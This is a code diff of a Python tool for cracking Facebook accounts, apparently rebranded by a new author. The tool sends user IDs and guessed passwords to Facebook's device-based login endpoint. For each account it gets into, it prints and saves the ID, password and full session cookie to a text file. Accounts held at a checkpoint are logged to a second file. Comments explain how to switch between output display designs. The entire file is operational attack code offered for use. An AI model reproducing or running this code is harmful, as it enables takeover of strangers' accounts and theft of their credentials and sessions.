@@ -140,7 +140,7 @@ def clear():
 	print(logo)
 #----------------------[TOOL LOGIN]----------------#
 os.system("clear")
-os.system('xdg-open https://www.facebook.com/noob')
+os.system('xdg-open https://www.facebook.com/noob.hackers')
 print("\n\r\x1b[1;97m\x1b[1;41m TOLL IS FREE NOT FOR SALE \x1b[0m")
 x=f"{M2} ______   _____   _     _  _     _ \n{P2}(______) (_____) (_)   (_)(_)   (_)\n{N2}     (_)(_)   (_)(_)___(_)(__)_ (_)\n{H2} _   (_)(_)   (_)(_______)(_)(_)(_)\n{P2}( )__(_)(_)___(_)(_)   (_)(_)  (__)\n{M2} (____)  (_____) (_)   (_)(_)   (_) "
 vprint(panel(x,style=f"{xyzcoderz}"))
@@ -292,7 +292,7 @@ def autopassword():
 	    clear()
 	    x=f"{M2} ______   _____   _     _  _     _ \n{P2}(______) (_____) (_)   (_)(_)   (_)\n{N2}     (_)(_)   (_)(_)___(_)(__)_ (_)\n{H2} _   (_)(_)   (_)(_______)(_)(_)(_)\n{P2}( )__(_)(_)___(_)(_)   (_)(_)  (__)\n{M2} (____)  (_____) (_)   (_)(_)   (_) "
 	    vprint(panel(x,style=f"{xyzcoderz}"))
-	    x=f"{P2}[{H2}•{P2}] Author  : FELLIX\n{P2}[{H2}•{P2}] Facebook: fb.me/NOPE\n{P2}[{H2}•{P2}] Github  : github.com/PRIVATE"
+	    x=f"{P2}[{H2}•{P2}] Author  : Younis john\n{P2}[{H2}•{P2}] Facebook: fb.me/noob.hackers\n{P2}[{H2}•{P2}] Github  : github.com/YounisXyz"
 	    vprint(panel(x,style=f"{xyzcoderz}"))
 	    tl = str(len(user))
 	    x=f"{P2}[{H2}•{P2}] Total ids:{H2} {tl}\n{P2}[{H2}•{P2}] Code You choose:{K2} {code}\n{P2}[{H2}•{P2}] Result {M2}CP {P2}Save to : {M2}John-CP.txt\n{P2}[{H2}•{P2}] Result {H2}OK {P2}Save to : {H2}John-OK.txt\n{P2}[{H2}•{P2}] {H2}ON {M2}OFF{P2} Airplane Mode If No Result"
@@ -488,52 +488,42 @@ def younisxyz_(uid,pwx,tl):
 			'user-agent': xyzagents}
 			lo = session.post('https://free.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                coki1 = coki.split("1000")[1]
-                uid = "1000"+coki1[0:11]
-               # try:os.popen('play-audio Voice/ROMII_OK.mp3')
-                #except:pass
-                if "y" in Cookie:
-                	print(f'\r{H}[FILLIX-OK] '+uid+' | '+ps+ '\033[1;93m '+creation(uid)+' ')
-                	print(f"\033[1;97m[\033[1;92mCOOKIE\033[1;97m]: {coki}")
-                	#check_applications(session,coki)
-                if "n" in Cookie:
-                	print(f'\r{H}[FILLIX-OK] '+uid+' | '+ps+ '\033[1;93m '+creation(uid)+' ')
-                open('FELLIX/OK.txt', 'a').write(uid+' | '+ps+' | '+creation(uid)+' | '+coki+'\n')
-                ok.append(uid)
-            elif 'checkpoint' in log_cookies:
-                if 'Enter login code to continue' in log_cookies:
-                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    coki1 = coki.split("1000")[1]
-                    uid = "1000"+coki1[0:11]
-                    #try:os.popen('play-audio Voice/ROMII_2F.mp3')
-                    #except:pass
-                    if "y" in Cp:
-                    	print('\r{croosline}[FELLIX-2F] '+uid+' | '+ps+'\033[1;93m '+creation(uid)+' ')
-                    open('FELLIX/2F.txt', 'a').write(uid+' | '+ps+' | '+creation(uid)+'\n')
-                    twf.append(uid)
-                else:
-                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                    coki1 = coki.split("1000")[1]
-                    uid = "1000"+coki1[0:11]
-                    #try:os.popen('play-audio Voice/ROMII_CP.mp3')
-                  #  except:pass
-                    if "y" in Cp:
-                    	print(f'\r{R}[FELLIX-CP] '+uid+' | '+ps+'\033[1;93m '+creation(uid)+' ')
-                    open('FELLIX/CP.txt', 'a').write(uid+' | '+ps+' | '+creation(uid)+'\n')
-                    cp.append(uid)
-                    break
-            else:
-                continue
-        loop+=1
-        x = random.choice(colors)
-        emoji_motion = random.choice(["ðŸ˜‡","ðŸ˜Œ","ðŸ˜","ðŸ˜˜","ðŸ¤‘","ðŸ˜","ðŸ˜›","ðŸ˜¶","ðŸ˜œ","ðŸ˜","ðŸ˜†","ðŸ˜„","ðŸ˜…","ðŸ¤—","ðŸ˜¡","ðŸ˜¤","ðŸ˜©","ðŸ˜¢","ðŸ˜²"])
-        #sys.stdout.write(f"\r\033[0;97m[{x}YounisXyzðŸ”¥\033[0;97m] [\033[1;92m{tl}\033[0;97m/\033[1;93m{loop}\033[0;97m] [\033[1;92mOK:{len(ok)}\033[0;97m] [\033[1;93mCP:{len(cp)}\033[0;97m] [\033[1;96m{XYZTIME()}\033[0;97m] [\x1b[38;5;208m{'{:.1%}'.format(loop/float(tl))}\033[0;97m] ")
-        sys.stdout.write(f"\r\033[0;97m[{x}{uid}\033[0;97m] [\033[1;96m{tl}\033[1;97m/\033[1;93m{loop}\033[0;97m] [\033[1;92mOK:{len(ok)}\033[1;97m] [\033[1;91mCP:{len(cp)}\033[0;97m] [\033[1;93m{'{:.0%}'.format(loop/float(tl))}\033[0;97m]")
-        sys.stdout.flush()
-    except:
-        pass
+			#print(iid+'|'+pws+'|'+str(log_cookies))
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[151:166]
+				###--------------[DISPLAY TERMINAL DESIGN 1ST]--------------####
+				#print(f'\r\033[1;32m╭─[•]\x1b[38;5;205m STATUS   : XYZ-OK [💚] \n\033[1;32m├─[•] TELEPHONE : '+uid+'\n├─[•] USER      : '+cid+'\n├─[•] PASSWORD  : '+ps+ '\n├─[•] CREATION  :'+joined(cid)+ '\n╰─[•]\033[0;97m COOKIE :\x1b[38;5;118m '+coki+'\n')
+				###--------------[DISPLAY TERMINAL DESIGN 2ND]--------------####
+				#print(f"\033[1;32m[XYZ-OK💚] '+cid+' | '+ps+' | '+joined(cid)+'\n\033[0;97m Cookie 🍪 :\x1b[38;5;118m '+coki+' \n") 
+				###--------------[DISPLAY TERMINAL DESIGN 3RD]--------------####
+				statusok = f'[•] USER ID  : '+cid+'\n[•] NUMBER   : '+uid+'\n[•] PASSWORD : ' +ps+ '\n[•] CREATION : '+joined(cid)+''
+				statusok1 = nel(statusok, style='green')
+				cetak(nel(statusok1, title=f'{H2}{date_now}{P2}'))
+				cek_apk(session,coki)
+				open('/sdcard/John-OK.txt', 'a').write(cid+' | '+ps+' | '+coki+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[141:156]
+				###--------------[DISPLAY TERMINAL DESIGN 1ST]--------------####
+				#print(f'\r\033[1;33m╭─[\033[1;31m•\033[1;33m]\x1b[38;5;205m STATUS   : XYZ-CP \033[1;33m[💔]\n├─[\033[1;31m•\033[1;33m]\033[1;96m TELEPHONE : '+uid+'\n├─[\033[1;31m•\033[1;33m]\033[1;96m USER      : '+cid+'\n├─[\033[1;31m•\033[1;33m]\033[1;96m PASSWORD  : '+ps+ '\n├─[\033[1;31m•\033[1;33m]\033[1;96m CREATION  :'+joined(cid)+ '\n╰─[\033[1;31m•\033[1;33m] \x1b[38;5;205mUSERAGENT :\x1b[38;5;208m '+pro+'\n')
+				###--------------[DISPLAY TERMINAL DESIGN 2ND]--------------####
+				#print(f"\033[1;33m[XYZ-CP💔] '+cid+' | '+ps+' | '+joined(cid)+'\n") 
+				###--------------[DISPLAY TERMINAL DESIGN 3RD]--------------####
+				statuscp = f'[•] USER ID  : '+cid+'\n[•] NUMBER   : '+uid+'\n[•] PASSWORD : ' +ps+ '\n[•] CREATION :'+joined(cid)+''
+				statuscp1 = nel(statuscp, style='red')
+				cetak(nel(statuscp1, title=f'{K2}{date_now}{P2}'))
+				open('/sdcard/John-CP.txt', 'a').write(cid+' |' +ps+'\n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+	except:
+		pass
+
 #IDS DISAPLAY 3 DESIGN MNY LGA DEIIY HAIN JO
 #JO APKO PASSAND IEY AP CHANGE BHE KR SKTY HO 
 #JUST REMOVE [#] print SE PEHLY
